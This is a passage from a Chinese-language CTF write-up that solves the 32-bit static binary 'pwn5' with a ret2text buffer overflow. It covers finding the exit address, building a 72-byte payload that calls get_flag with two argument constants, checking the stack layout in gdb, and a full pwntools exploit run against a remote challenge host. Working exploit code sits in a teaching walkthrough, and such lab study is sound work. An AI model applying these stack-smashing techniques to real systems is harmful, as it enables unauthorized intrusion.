输出会有一大堆 `__cxa_atexit`、`__run_exit_handlers`、`_exit` 之类的干扰项，别抓错。要找的是符号头那一行：

```text
0804e6a0 <exit>:
```

所以 `EXIT_ADDR = 0x0804e6a0`。

除了 `objdump`，这题因为没 stripped，还有更省事的办法：

```bash
nm ./pwn5 | grep ' exit'
```

会直接给出 `0804e6a0 T exit`。在 IDA 的函数列表里搜 `exit` 也行。工具选顺手的就好。

{% note info %}
**`exit` 的参数是什么？** cdecl 下 `exit(int status)` 从 `[esp+4]` 取参数。`get_flag` 的 `ret` 跳到 `exit` 后，`[esp]` 是 `a1`（被当成 `exit` 的假返回地址），`[esp+4]` 是 `a2`（被当成退出码）。`exit` 不会返回，所以返回地址是垃圾没关系；退出码是 `0x195719d1` 也无所谓，我们只看 stdout。
{% endnote %}

## 写 exp

思路齐了：56 字节填充，然后依次摆 `get_flag`、`exit`、`a1`、`a2`。

先确认地址和常量：

| 名称 | 值 | 说明 |
| --- | --- | --- |
| `PADDING` | `56` | `v4` 到返回地址 |
| `BACKDOOR_ADDR` | `0x080489a0` | `get_flag` 入口 |
| `EXIT_ADDR` | `0x0804e6a0` | `exit` 入口 |
| `a1` | `0x308cd64f` | 814536271 |
| `a2` | `0x195719d1` | 425138641 |

32 位地址用 `p32` 打包成 4 字节小端：

```python
>>> p32(0x080489a0)
b'\xa0\x89\x04\x08'
>>> p32(0x0804e6a0)
b'\xa0\xe6\x04\x08'
```

内存里是 `a0 89 04 08`，CPU 按小端读回去正好是 `0x080489a0`。

### 先本地调试

写 exp 时最容易犯的错是“地址对了，但栈摆错了”。所以先别急着打远程，用 `gdb.debug` 把 payload 送进去，停在 `get_flag` 入口看一眼。

```python
from pwn import *

context.log_level = 'info'
context.terminal = ["tmux", "new-window"]

PADDING = 56
BACKDOOR_ADDR = 0x080489a0
EXIT_ADDR = 0x0804e6a0
V1 = 0x308cd64f
V2 = 0x195719d1

io = gdb.debug('./pwn5', gdbscript='''
    b *main
    continue
''')

payload = b'A' * PADDING
payload += p32(BACKDOOR_ADDR)
payload += p32(EXIT_ADDR)
payload += p32(V1)
payload += p32(V2)

log.info(f"Sending Payload ({len(payload)}bytes)")
io.sendline(payload)
io.interactive()
```

`gdb.debug` 会另开一个终端跑 gdb，`context.terminal` 要先配好。用 tmux 的话，先 `tmux` 进会话，再运行 exp；如果之前没配过，可以回看 [n_1 那篇的调试章节](/2026/11/06/pwn-ctf-ciscn-2019-n-1/)。

`b *main` 在 `main` 入口下断点，`continue` 让它跑起来。gdb 会停在这里：

![gdb 停在 main](image-7.png)

*图 9：gdb 停在 `main` 入口，注意 `ESP = 0xff8e5f9c`*

此时程序还没执行 `sub esp, 0x3c`，`esp` 指向 `main` 的返回地址。`sendline` 只是把数据写进连接的缓冲区，真正读它的是后面的 `gets`。

接着在 gdb 里给 `get_flag` 下断点：

```text
pwndbg> b get_flag
pwndbg> c
```

![给 get_flag 下断点](image-8.png)

*图 10：`b get_flag` 命中 `0x80489a0`*

程序停在 `get_flag` 的第一条指令（`push esi` 还没执行），此时 `gets` 已经把 payload 读进栈了。

### 用 telescope 看栈

```text
pwndbg> telescope $esp
```

![telescope 查看栈](image-10.png)

*图 11：`get_flag` 入口处的栈，`[esp]` 是 exit，`[esp+4]`、`[esp+8]` 是两个参数*

```text
00:0000  esp 0xff8e5fa0 -> 0x804e6a0 (exit)
01:0004  0xff8e5fa4 <- 0x308cd64f
02:0008  0xff8e5fa8 <- 0x195719d1
03:000c  0xff8e5fac -> 0xff8e5f00 <- 0
...
```

从 `esp` 开始往上读：

| 偏移 | 值 | 含义 |
| --- | --- | --- |
| `esp+0x00` | `0x0804e6a0` | `get_flag` 的返回地址 = `exit` |
| `esp+0x04` | `0x308cd64f` | `a1` |
| `esp+0x08` | `0x195719d1` | `a2` |

**和我们的设计完全一致。** 这也顺便验证了偏移 56 是对的：如果偏移写错，`exit` 就不会刚好落在 `[esp]`，`a1` / `a2` 也会错位。

{% note info %}
**telescope 的显示顺序和我们画的图是反的。** `telescope` 从 `esp`（低地址）开始往下排，第一行是低地址；我们手画的栈图习惯把高地址放上面。所以对照的时候别硬套，认准“第一行 = `esp`”就不会乱。
{% endnote %}

### 打远程

确认栈布局无误后，把 `gdb.debug` 换回 `remote`：

```python
from pwn import *

context.log_level = 'info'

HOST = '0d25ba4c0407d8e1c10f52f6.tcp-ctf2.dasctf.com'
PORT = 9999

PADDING = 56
BACKDOOR_ADDR = 0x080489a0
EXIT_ADDR = 0x0804e6a0
V1 = 0x308cd64f
V2 = 0x195719d1

io = remote(HOST, PORT, ssl=True, sni=HOST)

payload = b'A' * PADDING
payload += p32(BACKDOOR_ADDR)
payload += p32(EXIT_ADDR)
payload += p32(V1)
payload += p32(V2)

log.info(f"Sending Payload ({len(payload)}bytes)")
io.sendline(payload)
io.interactive()
```

运行：

```bash
python3 pwn5.py
```

![远程拿 flag](image-11.png)

*图 12：payload 发送成功，`get_flag` 把 flag 打到标准输出*

```text
[+] Opening connection to 0d25ba4c0407d8e1c10f52f6.tcp-ctf2.dasctf.com on port 9999: Done
[*] Sending Payload (72bytes)
[*] Switching to interactive mode
Qual a palavrinha magica? CTF2{a0362927-62a8-4384-bd6f-4c9caa2f9feb}
[*] Got EOF while reading in interactive
```

flag 是：

```text
CTF2{a0362927-62a8-4384-bd6f-4c9caa2f9feb}
```

提示语后面紧跟着 flag，没有 `$` 提示符——因为 `get_flag` 只是打印文件内容，不是起 shell。打完 `exit` 正常退出，连接关闭，`Got EOF` 是预期收尾。

另外，截图里提示语和 flag 挤在同一行，也是全缓冲的体现：`printf` 的提示语早就写进缓冲区了，但一直没刷新，直到 `exit` 才和 flag 一起发出来。这也从侧面证明 `exit` 确实在起作用。

## 新手常见问题

{% note info **Q1：偏移为什么是 56，不是 60？** %}
`sub esp, 0x3c` 留了 60 字节，但其中 `[esp]` 那 4 字节是传出参数槽，`v4` 从 `[esp+4]` 开始。`v4` 本身占 56 字节，正好写到 `esp+0x3c`，而 `esp+0x3c` 就是返回地址。所以填充 56 字节后，接下来的 4 字节直接覆盖返回地址，没有额外的保存 ebp。
{% endnote %}

{% note info **Q2：为什么这题没有保存的 ebp？** %}
`main` 的汇编里只有 `sub esp, 0x3c`，没有 `push ebp; mov ebp, esp`，所以栈上没有保存 ebp 这一格。32 位并不强制使用帧指针，编译器可以完全用 `esp` 寻址。64 位题常见的“缓冲区 + 8”是因为中间有保存的 rbp；这题没有，就不能套那个公式。
{% endnote %}

{% note info **Q3：为什么 `exit` 要放在 `get_flag` 后面、参数前面？** %}
`main` 的 `ret` 只弹走第一个槽（`get_flag`），`esp` 随后指向下一个槽。`get_flag` 进门时 `[esp]` 就是它自己的返回地址，所以那个槽必须放一个合法地址（这里选 `exit`）；参数按 cdecl 排在返回地址之后，于是顺序是 `get_flag → exit → a1 → a2`。
{% endnote %}

{% note info **Q4：为什么这题不用处理栈对齐？** %}
两层原因。第一，i386 ABI 最低只要求 4 字节对齐，32 位 glibc 里很多函数会避免依赖 16 字节对齐，不会像 64 位的 `system` 那样动不动踩 `movaps`。第二，`get_flag` 内部调用的是 `fopen` / `getc` / `putchar` / `fclose`，这题实测在入口 `esp` 错开 4 字节的情况下也能完整跑完。真遇到需要 16 字节对齐的 32 位目标，按前面的表补：栈上一个单元 4 字节，用 `ret` 把入口 `esp` 补到正常 `call` 的状态。
{% endnote %}

{% note info **Q5：`push`、`pop`、`call`、`ret` 分别怎么改 `esp`？** %}
`push` 是 `esp -= 4`，`pop` 是 `esp += 4`，`call` 先 `esp -= 4` 再跳转，`ret` 先 `esp += 4` 再跳转。64 位把这些数字换成 8。别记反 `ret` 的方向——它是往高地址走。
{% endnote %}

{% note info **Q6：为什么用 `p32` 不用 `p64`？** %}
地址是 4 字节。用 `p64` 每个地址会变成 8 字节，`get_flag`、`exit`、`a1`、`a2` 全部错位，`[esp]` 拿到的就不是 `exit` 了。`file` 里看到 `32-bit`、`checksec` 里看到 `i386-32-little`，就用 `p32`。
{% endnote %}

{% note info **Q7：payload 里的 `\x00` 会被 `gets` 截断吗？** %}
不会。`gets` 按字节读，直到遇到换行或 EOF，`\x00` 只是普通字节。真正要小心的是 `\x0a`（换行）：如果地址或参数里出现 `0x0a`，`gets` 会提前停止，payload 就被截断了。这题的 `0x080489a0`、`0x0804e6a0`、`0x308cd64f`、`0x195719d1` 都不含 `0x0a`，所以没事。
{% endnote %}

{% note info **Q8：静态链接和动态链接对做题有什么影响？** %}
静态链接把 libc 打进程序，函数地址在 No PIE 下固定，找 `exit` 可以直接 `objdump` / `nm`；动态链接的 libc 在运行时加载，地址每次随机，通常要先泄露再查 `libc-database`。这题是静态链接，省掉了整个 libc 泄露环节。
{% endnote %}

{% note info **Q9：为什么不能直接返回到 `main` 或 `_start`？** %}
可以试，但都不如 `exit` 稳。`main` 会重新执行一遍 `printf` 和 `gets`，等于回到起点；`_start` 会重新跑一遍程序初始化，还要求启动时的栈布局是对的，从溢出后的栈跳过去很容易在半路崩掉。`exit` 只做一件事：刷新 stdio 流、结束进程，正好是我们需要的收尾。
{% endnote %}

{% note info **Q10：除了 objdump，还能怎么找 `exit`？** %}
因为是 `not stripped`，`nm ./pwn5 | grep ' exit'` 会直接给出 `0804e6a0 T exit`；IDA 的函数列表里搜 `exit` 也行；`readelf -s ./pwn5 | grep exit` 同样可以。`objdump -d` 的好处是能顺便看到调用关系，坏处是静态链接的输出很长，要 `grep` 过滤。
{% endnote %}

{% note info **Q11：如果参数写反了会怎样？** %}
`get_flag` 里第一个 `cmp` 比较的是 `[esp+0x10]`（也就是 `a1`）和 `0x308cd64f`，第二个比较 `[esp+0x14]`（`a2`）和 `0x195719d1`。写反了会走 `jne` 到 `+117`，`add esp,8; pop esi; ret` 正常返回 `exit`，程序不崩但什么也不打印。所以“连上了、看到了提示语、却没有 flag”时，先检查这两个常量。
{% endnote %}

{% note info **Q12：远程连不上怎么办？** %}
这类 `*.tcp-ctf2.dasctf.com` 的地址走 TLS，必须 `remote(HOST, PORT, ssl=True, sni=HOST)`；普通 `nc` 靶场直接 `remote(HOST, PORT)`，加了 `ssl=True` 反而连不上。再确认靶场没过期，这类临时地址失效是常态。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看文件类型 | `file pwn5`，确认 32 位、静态链接、not stripped |
| 2 | 看保护 | `checksec --file=pwn5`，No canary、No PIE、NX enabled |
| 3 | 看 main | `sub esp,0x3c`，`v4` 在 `esp+4`，`gets(v4)` |
| 4 | 算偏移 | `0x3c - 0x4 = 0x38 = 56`（无保存 ebp） |
| 5 | 看 get_flag | 要求 `a1 == 0x308cd64f`、`a2 == 0x195719d1` |
| 6 | 确认参数位置 | 序言 `push esi; sub esp,8` 后，参数在 `[esp+0x10]` / `[esp+0x14]` |
| 7 | 找 exit | `objdump -d ./pwn5 \| grep -i exit`，得到 `0x0804e6a0` |
| 8 | 搭 payload | `'A'*56 + p32(get_flag) + p32(exit) + p32(a1) + p32(a2)` |
| 9 | gdb 验证 | 停在 `get_flag` 入口，`telescope $esp` 看三个槽 |
| 10 | 打远程 | 换回 `remote`，`sendline`，拿 flag |

## 小结

这道题是 64 位到 32 位的分水岭，几个知识点值得反复看：

- **32 位参数走栈，64 位参数走寄存器。** cdecl 从右往左压栈，`call` 把返回地址压在最上面；函数进门时 `[esp]` 是返回地址，参数在它上面。
- **调用约定看寄存器名就能判断。** `eax` / `esp` / `edi` 是 32 位，`rax` / `rsp` / `rdi` 是 64 位；IDA 的 `__cdecl` 也是提示。
- **偏移要对着汇编算。** 这题 `main` 没有 `push ebp`，所以是 56 而不是 60；`0x3c` 里还有 4 字节是传出参数槽，别把它算进缓冲区。
- **函数的序言会移动 `esp`。** `push esi; sub esp,8` 让参数从 `[esp+4]` 挪到 `[esp+0x10]`，看 `cmp` 的偏移时要先把序言的 12 字节加回去。
- **ret2text 带参数 = 手工搭一个假调用栈。** 目标地址、返回地址、参数依次排好，形状和 `push a2; push a1; call func` 一样。
- **打印型后门需要收尾。** `putchar` 的输出在 stdio 缓冲区里，进程崩了就没了；静态链接下找 `exit` 很方便，它会刷新缓冲区再退出。
- **glibc 是 Linux 的 C 标准库实现。** `printf`、`fopen`、`system`、`exit` 都是它提供的；动态链接时在 `libc.so.6` 里，静态链接（本题）时被打进程序，所以函数地址固定、不用泄露 libc。
- **栈对齐在 32 位通常不用管。** i386 最低只要求 4 字节，多数 32 位 glibc 函数不依赖 16 字节对齐；真遇到依赖 SSE 对齐的目标，再用 `ret` 按 4 字节的倍数补。

下一题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 32 位 + canary | 先泄露 canary，再覆盖返回地址 |
| 32 位 + PIE | 先泄露程序基址，再算真实地址 |
| 动态链接的 32 位 | ret2libc：泄露 libc 地址，找 `system` 和 `/bin/sh` |
| 没有现成后门 | 自己拼 ROP 链，用 `int 0x80` 或 `sysenter` 调系统调用 |
| 参数更多的函数 | 继续往栈上摆，注意返回地址和参数的相对位置 |

{% note success %}
**一条经验**：从 64 位切到 32 位，最先要改的不是工具，而是“参数在哪”的直觉。看到 `cmp [esp+0x10]` 不要急着算，先问自己：函数序言把 `esp` 移动了多少？把这段加回去，参数的原始位置就出来了。工具只是手，栈图才是关键。
{% endnote %}
